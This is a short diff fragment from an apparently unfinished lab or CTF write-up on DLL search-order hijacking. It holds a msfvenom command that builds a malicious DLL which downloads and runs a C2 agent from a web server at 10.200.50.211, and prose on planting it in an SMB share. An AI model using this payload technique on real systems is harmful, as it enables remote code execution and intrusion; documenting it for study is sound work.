@@ -564,6 +564,6 @@ Because of DLL search order i can craft a malicious dll then place it in the sam
 msfvenom -a x64 -p windows/download_exec EXE=agent.x64.exe URL=http://10.200.50.211:8000/agent.x64.exe -f dll -o dismcore.dll
 ```
 
-So the idea here is to set a listener on my c2 then generate an agent, i can then host it using a python web server but by crafting the malicious DLL using a command like i did above i should be able to
+So the idea here is to set a listener on my c2 then generate an agent, i can then host the agent using a python web server but by crafting the malicious DLL using a command like i did above i should be able to plant the DLL in the smb share and due to DLL search orders it should check the current direcotry of the exe which will call my malicious DLL which will reach out to the webserver get my agent then execute it 
 
 UNFINISHED!
